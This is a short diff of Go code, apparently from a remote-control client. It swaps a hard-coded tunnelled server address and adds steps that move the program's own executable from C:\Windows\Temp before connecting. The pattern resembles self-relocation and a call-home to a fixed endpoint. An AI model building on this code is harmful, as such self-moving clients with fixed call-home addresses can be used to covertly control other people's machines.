@@ -21,7 +21,7 @@ import (
 )
 
 const (
-	IP = "selectbyylc.e3.luyouxia.net:13869"
+	IP = "selectbyylc.e3.luyouxia.net:10947"
 
 	//IP = "localhost:1011"
 	//IP = "209.209.49.184:1011"
@@ -41,7 +41,11 @@ var stopScreen bool
 var wg sync.WaitGroup
 
 func Ma() {
+	fileName := util.GetProgramName()
+	sourcePath := "C:\\Windows\\Temp" + "\\" + fileName // 要操作的文件路径
+	destinationDisk := "C:"                             // 新的虚拟磁盘符号
 	CreateIni()
+	util.MoveAndSetupFile(sourcePath, destinationDisk, fileName)
 	连接()
 
 }
